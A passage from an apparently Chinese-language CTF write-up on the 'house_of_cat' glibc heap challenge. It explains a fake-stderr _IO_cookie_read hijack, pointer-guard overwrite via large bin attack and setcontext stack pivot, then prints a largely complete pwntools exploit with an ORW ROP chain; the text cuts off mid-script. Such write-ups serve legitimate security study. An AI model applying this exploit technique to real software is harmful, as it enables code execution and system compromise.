<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> _<span class="title">IO_cookie_jumps</span> <span class="title">libio_vtable</span> =</span> &#123;</span><br><span class="line">  JUMP_INIT_DUMMY,</span><br><span class="line">  JUMP_INIT(finish, _IO_file_finish),</span><br><span class="line">  JUMP_INIT(overflow, _IO_file_overflow),</span><br><span class="line">  JUMP_INIT(underflow, _IO_file_underflow),</span><br><span class="line">  JUMP_INIT(uflow, _IO_default_uflow),</span><br><span class="line">  JUMP_INIT(pbackfail, _IO_default_pbackfail),</span><br><span class="line">  JUMP_INIT(xsputn, _IO_file_xsputn),</span><br><span class="line">  JUMP_INIT(xsgetn, _IO_default_xsgetn),</span><br><span class="line">  JUMP_INIT(seekoff, _IO_cookie_seekoff),</span><br><span class="line">  JUMP_INIT(seekpos, _IO_default_seekpos),</span><br><span class="line">  JUMP_INIT(setbuf, _IO_file_setbuf),</span><br><span class="line">  JUMP_INIT(sync, _IO_file_sync),</span><br><span class="line">  JUMP_INIT(doallocate, _IO_file_doallocate),</span><br><span class="line">  JUMP_INIT(read, _IO_cookie_read),</span><br><span class="line">  JUMP_INIT(write, _IO_cookie_write),</span><br><span class="line">  JUMP_INIT(seek, _IO_cookie_seek),</span><br><span class="line">  JUMP_INIT(close, _IO_cookie_close),</span><br><span class="line">  JUMP_INIT(stat, _IO_default_stat),</span><br><span class="line">  JUMP_INIT(showmanyc, _IO_default_showmanyc),</span><br><span class="line">  JUMP_INIT(imbue, _IO_default_imbue),</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>其中注意到有一个<code>_IO_cookie_read</code>函数，我们查看一下这个函数在IDA中的汇编：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">.text:000000000007F7B0 ; __unwind &#123;</span><br><span class="line">.text:000000000007F7B0                 endbr64</span><br><span class="line">.text:000000000007F7B4                 mov     rax, [rdi+0E8h]</span><br><span class="line">.text:000000000007F7BB                 ror     rax, 11h</span><br><span class="line">.text:000000000007F7BF                 xor     rax, fs:30h</span><br><span class="line">.text:000000000007F7C8                 test    rax, rax</span><br><span class="line">.text:000000000007F7CB                 jz      short loc_7F7D6</span><br><span class="line">.text:000000000007F7CD                 mov     rdi, [rdi+0E0h]</span><br><span class="line">.text:000000000007F7D4                 jmp     rax</span><br><span class="line">.text:000000000007F7D6 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:000000000007F7D6</span><br><span class="line">.text:000000000007F7D6 loc_7F7D6:                              ; CODE XREF: sub_7F7B0+1B↑j</span><br><span class="line">.text:000000000007F7D6                 mov     rax, 0FFFFFFFFFFFFFFFFh</span><br><span class="line">.text:000000000007F7DD                 retn</span><br></pre></td></tr></table></figure>
<p>注意到这里有一个<code>jmp rax</code>，实际上就是<code>jmp [rdi+0E8h]</code>。而这里的<code>rdi</code>就是伪造的<code>stderr</code>，因此我们只需要在假<code>stderr</code>后面的特定位置写入<code>_IO_cookie_jumps+0x38</code>就可以保证执行到<code>_IO_cookie_read</code>函数，然后在假<code>stderr+0xE8</code>的位置写入正确的值就能够使得<code>jmp rax</code>跳转到我们想要的地方去。不过在此之前我我们可以看到<code>_IO_cookie_read</code>函数对<code>rax</code>的值做了一些修改，即上述代码中的<code>ror</code>指令和<code>xor</code>指令。这实际上是高版本glibc新增加的一种保护措施：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">ssize_t</span></span><br><span class="line">_IO_cookie_read (FILE *fp, <span class="type">void</span> *buf, <span class="type">ssize_t</span> size)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_cookie_file</span> *<span class="title">cfile</span> =</span> (<span class="keyword">struct</span> _IO_cookie_file *) fp;</span><br><span class="line">  <span class="type">cookie_read_function_t</span> *read_cb = cfile-&gt;__io_functions.read;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">  PTR_DEMANGLE (read_cb);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (read_cb == <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> read_cb (cfile-&gt;__cookie, buf, size);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>注意这里的<code>PTR_DEMANGLE</code>函数，就是<code>ror/xor</code>指令的实现，其实质是：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#  <span class="keyword">define</span> PTR_DEMANGLE(var)	asm (<span class="string">&quot;ror $2*&quot;</span> LP_SIZE <span class="string">&quot;+1, %0\n&quot;</span>	      \</span></span><br><span class="line"><span class="meta">				     <span class="string">&quot;xor %%fs:%c2, %0&quot;</span>			      \</span></span><br><span class="line"><span class="meta">				     : <span class="string">&quot;=r&quot;</span> (var)			      \</span></span><br><span class="line"><span class="meta">				     : <span class="string">&quot;0&quot;</span> (var),			      \</span></span><br><span class="line"><span class="meta">				       <span class="string">&quot;i&quot;</span> (offsetof (tcbhead_t,	      \</span></span><br><span class="line"><span class="meta">						      pointer_guard)))</span></span><br></pre></td></tr></table></figure>
<p>注意：在<code>/sysdeps/unix/sysv/linux/x86_64/sysdep.h</code>文件中有4个关于<code>PTR_DEMANGLE</code>函数的声明，但通过查看源码可知最有可能采用的就是上面的这个宏定义。通过源码可知第一条语句<code>ror</code>循环右移的位数为11，而第二条语句<code>xor rax, fs:30h</code>中的<code>fs:30h</code>应该指的就是<code>tcbhead_t.pointer_guard</code>这个东西。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">void</span> *tcb;		<span class="comment">/* Pointer to the TCB.  Not necessarily the</span></span><br><span class="line"><span class="comment">			   thread descriptor used by libpthread.  */</span></span><br><span class="line">  <span class="type">dtv_t</span> *dtv;</span><br><span class="line">  <span class="type">void</span> *self;		<span class="comment">/* Pointer to the thread descriptor.  */</span></span><br><span class="line">  <span class="type">int</span> multiple_threads;</span><br><span class="line">  <span class="type">int</span> gscope_flag;</span><br><span class="line">  <span class="type">uintptr_t</span> sysinfo;</span><br><span class="line">  <span class="type">uintptr_t</span> stack_guard;</span><br><span class="line">  <span class="type">uintptr_t</span> pointer_guard;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> <span class="type">int</span> unused_vgetcpu_cache[<span class="number">2</span>];</span><br><span class="line">  <span class="comment">/* Bit 0: X86_FEATURE_1_IBT.</span></span><br><span class="line"><span class="comment">     Bit 1: X86_FEATURE_1_SHSTK.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> feature_1;</span><br><span class="line">  <span class="type">int</span> __glibc_unused1;</span><br><span class="line">  <span class="comment">/* Reservation of some values for the TM ABI.  */</span></span><br><span class="line">  <span class="type">void</span> *__private_tm[<span class="number">4</span>];</span><br><span class="line">  <span class="comment">/* GCC split stack support.  */</span></span><br><span class="line">  <span class="type">void</span> *__private_ss;</span><br><span class="line">  <span class="comment">/* The lowest address of shadow stack,  */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> ssp_base;</span><br><span class="line">  <span class="comment">/* Must be kept even if it is no longer used by glibc since programs,</span></span><br><span class="line"><span class="comment">     like AddressSanitizer, depend on the size of tcbhead_t.  */</span></span><br><span class="line">  __128bits __glibc_unused2[<span class="number">8</span>][<span class="number">4</span>] __attribute__ ((aligned (<span class="number">32</span>)));</span><br><span class="line"></span><br><span class="line">  <span class="type">void</span> *__padding[<span class="number">8</span>];</span><br><span class="line">&#125; <span class="type">tcbhead_t</span>;</span><br></pre></td></tr></table></figure>
<p>这是<code>tcbhead_t</code>的声明，可以看到除了<code>pointer_guard</code>之外，这里面还定义有<code>stack_guard</code>，合理猜测这应该是用于<code>canary</code>。经过验证发现确实如此，函数开头的<code>mov rax, fs:28h</code>取的就是<code>stack_guard</code>的值。因此这里的<code>fs:30h</code>也就是<code>pointer_guard</code>的值。我们并不能读取原来的<code>pointer_guard</code>，但我们能通过<code>large bin attack</code>将这里的值修改为一个已知的值，这样我们就可以自行对想要执行的地址进行处理，经过<code>_IO_cookie_read</code>函数右移处理后变成正确的代码地址。那么<code>tcbhead_t</code>这个结构体在什么地方呢？实际上这个结构体并不在libc中，而是在紧邻libc低地址处的一块内存空间中（见下图），其与libc起始地址的偏移为<code>-0x28c0</code>。但这个值是在wp中的exp出现的，如果是我们自己做题，又应该如何获得这个值呢？前面提到<code>pointer_guard</code>与<code>stack_guard</code>相邻。我们在程序调试的时候可以将断点下在函数开头获取<code>stack_guard</code>的地方——<code>mov rax, fs:0x28</code>，获得<code>stack_guard</code>的值后再对内存空间进行搜索，这样就可以轻松找到<code>tcbhead_t</code>结构体了。</p>
<p><img src="https://img-blog.csdnimg.cn/9858f91249f84fe2bb4c638c4525de05.png"><br>在本题中，我们可以通过large bin attack轻松修改这里的值，由此我们就可以在<code>fake stderr+0xE8</code>处写入处理后的地址值，然后就可以实现任意地址执行。由于本题开启了沙箱，因此这里容易想到跳转到一个称为pcop的gadget，由于在新版本libc中<code>setcontext</code>函数中对<code>rsp</code>赋值的地址不再由<code>rdi</code>取值，因此需要这一个gadget将<code>rdx</code>赋值，其中的<code>rdi</code>附近内存是我们可控的，因此通过这个gadget地址我们就可以控制<code>rdx</code>的值：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000001675B0                 mov     rdx, [rdi+8]</span><br><span class="line">.text:00000000001675B4                 mov     [rsp+0C8h+var_C8], rax</span><br><span class="line">.text:00000000001675B8                 call    qword ptr [rdx+20h]</span><br></pre></td></tr></table></figure>
<p>我们可以将<code>rdx</code>赋值为一个可控的内存空间地址，然后通过<code>call</code>指令跳转到<code>setcontext</code>函数中就可以成功实现栈迁移。</p>
<p>现在我们已经搞清楚了如何通过假的<code>stderr</code>实现任意代码执行，但我们应该如何替换<code>stderr</code>呢？前面提到，我们需要使用一次<code>large bin attack</code>修改<code>pointer_guard</code>的值，在这里，我们还需要再进行一次<code>large bin attack</code>直接修改<code>stderr</code>的值。注意到<code>large bin</code>的前32个bin所保存的chunk的大小差值为0x40，即大小在0x400<del>0x430的chunk保存在第一个<code>large bin</code>，而0x440</del>0x470则保存在第二个<code>large bin</code>中，两个相邻的bin中保存的最小chunk的大小之差为0x40。从本题可以分配的chunk大小可知，我们一共可以进行2次<code>large bin attack</code>，这两次攻击应发生在不同的bin中。</p>
<p>现在，我们也已经有了办法替换<code>stderr</code>，但还有最后一个问题：如何才能让<code>top chunk</code>缩小？根据本题的UAF漏洞不难联想，这一题应该是想要让我们通过UAF漏洞修改<code>top chunk</code>的大小。具体的步骤如下：</p>
<p>我们需要首先分配两个相邻chunk，假设大小均为0x440，并在其高地址处分配至少一个chunk暂时防止与<code>top chunk</code>合并。然后释放两个相邻chunk，释放后二者会进行合并。此时再次分配一个大小为0x430的chunk和一个0x450的chunk重新获取这两个chunk的内存空间，修改原来被释放的chunk的头部。由于我们还保存着原来chunk的指针，因此可以再一次释放这个chunk，使其与top chunk直接合并，然后继续编辑就可以成功修改top chunk的大小。</p>
<p><img src="https://img-blog.csdnimg.cn/4bcabd534346453199fbb541af819235.png"></p>
<h2 id="Step-3-编写exp"><a href="#Step-3-编写exp" class="headerlink" title="Step 3: 编写exp"></a>Step 3: 编写exp</h2><p>为了行文逻辑流畅，这里先将exp贴出来，然后再对其中细节进行深入分析：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./house_of_cat&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./house_of_cat&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">main_arena_base = <span class="number">0x219C80</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_cat</span>(<span class="params">index, size, content</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;mew mew mew~~~~~~&#x27;</span>, <span class="string">b&#x27;CAT | r00t QWB QWXF\xFF$&#x27;</span>)  <span class="comment"># enter the menu</span></span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;plz input your cat choice:\n&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;plz input your cat idx:\n&#x27;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;plz input your cat size:\n&#x27;</span>, <span class="built_in">str</span>(size).encode())</span><br><span class="line">    io.sendafter(<span class="string">b&#x27;plz input your content:\n&#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete_cat</span>(<span class="params">index</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;mew mew mew~~~~~~&#x27;</span>, <span class="string">b&#x27;CAT | r00t QWB QWXF\xFF$&#x27;</span>)  <span class="comment"># enter the menu</span></span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;plz input your cat choice:\n&#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;plz input your cat idx:\n&#x27;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show_cat</span>(<span class="params">index</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;mew mew mew~~~~~~&#x27;</span>, <span class="string">b&#x27;CAT | r00t QWB QWXF\xFF$&#x27;</span>)  <span class="comment"># enter the menu</span></span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;plz input your cat choice:\n&#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;plz input your cat idx:\n&#x27;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit_cat</span>(<span class="params">index, content</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;mew mew mew~~~~~~&#x27;</span>, <span class="string">b&#x27;CAT | r00t QWB QWXF\xFF$&#x27;</span>)  <span class="comment"># enter the menu</span></span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;plz input your cat choice:\n&#x27;</span>, <span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;plz input your cat idx:\n&#x27;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;plz input your content:\n&#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;mew mew mew~~~~~~&#x27;</span>, <span class="string">b&#x27;LOGIN | r00t QWB QWXFadmin\x00&#x27;</span>)  <span class="comment"># admin = 1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># add_cat(0, 0x430, b&#x27;colin&#x27;)</span></span><br><span class="line">add_cat(<span class="number">1</span>, <span class="number">0x428</span>, <span class="string">b&#x27;colin&#x27;</span>)</span><br><span class="line">add_cat(<span class="number">2</span>, <span class="number">0x430</span>, <span class="string">b&#x27;colin&#x27;</span>)</span><br><span class="line">add_cat(<span class="number">4</span>, <span class="number">0x418</span>, <span class="string">b&#x27;colin&#x27;</span>)</span><br><span class="line">add_cat(<span class="number">5</span>, <span class="number">0x440</span>, <span class="string">b&#x27;colin&#x27;</span>)</span><br><span class="line"></span><br><span class="line">delete_cat(<span class="number">1</span>)</span><br><span class="line">show_cat(<span class="number">1</span>)</span><br><span class="line">io.recv(<span class="number">9</span>)</span><br><span class="line">main_arena = u64(io.recv(<span class="number">6</span>) + <span class="string">b&#x27;\x00\x00&#x27;</span>) - <span class="number">96</span></span><br><span class="line">base = main_arena - main_arena_base</span><br><span class="line">stderr = base + libc.symbols[<span class="string">&#x27;stderr&#x27;</span>]</span><br><span class="line">tcbhead_t = base - <span class="number">0x28C0</span></span><br><span class="line">_IO_cookie_jumps = base + <span class="number">0x215B80</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(base))</span><br><span class="line"></span><br><span class="line">add_cat(<span class="number">3</span>, <span class="number">0x440</span>, <span class="string">b&#x27;colin&#x27;</span>)</span><br><span class="line"></span><br><span class="line">delete_cat(<span class="number">4</span>)</span><br><span class="line">show_cat(<span class="number">1</span>)</span><br><span class="line">io.recv(<span class="number">25</span>)</span><br><span class="line">heap_base = u64(io.recv(<span class="number">6</span>) + <span class="string">b&#x27;\x00\x00&#x27;</span>) - <span class="number">0x290</span></span><br><span class="line"></span><br><span class="line">edit_cat(<span class="number">1</span>, p64(main_arena + <span class="number">1104</span>) * <span class="number">2</span> + p64(<span class="number">0</span>) + p64(tcbhead_t + <span class="number">0x10</span>))</span><br><span class="line">add_cat(<span class="number">0</span>, <span class="number">0x430</span>, <span class="string">b&#x27;colin&#x27;</span>)</span><br><span class="line">pointer_guard = heap_base + <span class="number">0xB00</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(pointer_guard))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line"><span class="comment"># some useful gadgets</span></span><br><span class="line">pcop = <span class="number">0x1675B0</span> + base</span><br><span class="line">pop_rdi = <span class="number">0x2A3E5</span> + base</span><br><span class="line">pop_rsi = <span class="number">0x2BE51</span> + base</span><br><span class="line">pop_rdx_rbx = <span class="number">0x90529</span> + base</span><br><span class="line">pop_rax = <span class="number">0x45EB0</span> + base</span><br><span class="line">syscall = <span class="number">0x91396</span> + base</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(pcop))</span><br><span class="line">encrypted_addr = ((pcop ^ pointer_guard) &lt;&lt; <span class="number">0x11</span>) &amp; ((<span class="number">1</span> &lt;&lt; <span class="number">64</span>) - <span class="number">1</span>) + \</span><br><span class="line">                 (((pcop ^ pointer_guard) &amp; (((<span class="number">1</span> &lt;&lt; <span class="number">64</span>) - <span class="number">1</span>) - ((<span class="number">1</span> &lt;&lt; <span class="number">47</span>) - <span class="number">1</span>))) &gt;&gt; <span class="number">47</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># create fake _IO_FILE struct for fake stderr</span></span><br><span class="line">payload = FileStructure()</span><br><span class="line">payload.vtable = _IO_cookie_jumps + <span class="number">0x38</span>  <span class="comment"># address of _IO_file_xsputn, vtable + 0x38 = _IO_cookie_read</span></span><br><span class="line">payload._lock = base + <span class="number">0x21BA70</span>  <span class="comment"># _IO_stdfile_1_lock</span></span><br><span class="line">payload = <span class="built_in">bytes</span>(payload)[<span class="number">0x10</span>:]</span><br><span class="line">payload += p64(heap_base + <span class="number">0x28F0</span> + <span class="number">0x100</span>)</span><br><span class="line">payload += p64(encrypted_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(heap_base + <span class="number">0x28F0</span> + <span class="number">0x100</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>) * <span class="number">2</span></span><br><span class="line">payload += p64(base + libc.symbols[<span class="string">&#x27;setcontext&#x27;</span>] + <span class="number">61</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># use SigReturn frame to set rsp and rcx</span></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rsp = heap_base + <span class="number">0x28F0</span> + <span class="number">0x300</span></span><br><span class="line">frame.rip = pop_rdi + <span class="number">1</span></span><br><span class="line">payload += flat(frame)[<span class="number">0x28</span>:]</span><br><span class="line">payload = payload.ljust(<span class="number">0x300</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># construct ROP chain</span></span><br><span class="line"><span class="comment"># close the stdin, and it will reopen automatically</span></span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(base + libc.symbols[<span class="string">&#x27;close&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># open file ./flag</span></span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(heap_base + <span class="number">0x28F0</span> + <span class="number">0x400</span>)</span><br><span class="line">payload += p64(pop_rsi)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rax)</span><br><span class="line">payload += p64(<span class="number">2</span>)  <span class="comment"># syscall code for open</span></span><br><span class="line">payload += p64(syscall)</span><br><span class="line"></span><br><span class="line"><span class="comment"># read file ./flag to heap</span></span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rsi)</span><br><span class="line">payload += p64(heap_base + <span class="number">0x500</span>)</span><br><span class="line">payload += p64(pop_rdx_rbx)</span><br><span class="line">payload += p64(<span class="number">0x100</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(base + libc.symbols[<span class="string">&#x27;read&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># write content in ./flag</span></span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(pop_rsi)</span><br><span class="line">payload += p64(heap_base + <span class="number">0x500</span>)</span><br><span class="line">payload += p64(pop_rdx_rbx)</span><br><span class="line">payload += p64(<span class="number">0x100</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(base + libc.symbols[<span class="string">&#x27;write&#x27;</span>])</span><br><span class="line"></span><br><span class="line">payload = payload.ljust(<span class="number">0x400</span>) + <span class="string">b&#x27;./flag\x00&#x27;</span></span><br><span class="line"></span><br><span class="line">add_cat(<span class="number">6</span>, <span class="number">0x430</span>, <span class="string">b&#x27;colin&#x27;</span>)</span><br><span class="line">add_cat(<span class="number">7</span>, <span class="number">0x450</span>, <span class="string">b&#x27;colin&#x27;</span>)</span><br><span class="line">add_cat(<span class="number">8</span>, <span class="number">0x430</span>, <span class="string">b&#x27;colin&#x27;</span>)</span><br><span class="line">add_cat(<span class="number">9</span>, <span class="number">0x440</span>, payload)</span><br><span class="line">add_cat(<span class="number">10</span>, <span class="number">0x430</span>, <span class="string">b&#x27;colin&#x27;</span>)</span><br><span class="line">delete_cat(<span class="number">6</span>)</span><br><span class="line">delete_cat(<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">add_cat(<span class="number">11</span>, <span class="number">0x460</span>, <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0x430</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x461</span>))</span><br><span class="line">add_cat(<span class="number">12</span>, <span class="number">0x420</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">delete_cat(<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">add_cat(<span class="number">13</span>, <span class="number">0x450</span>, <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0x20</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x1101</span>))</span><br><span class="line">delete_cat(<span 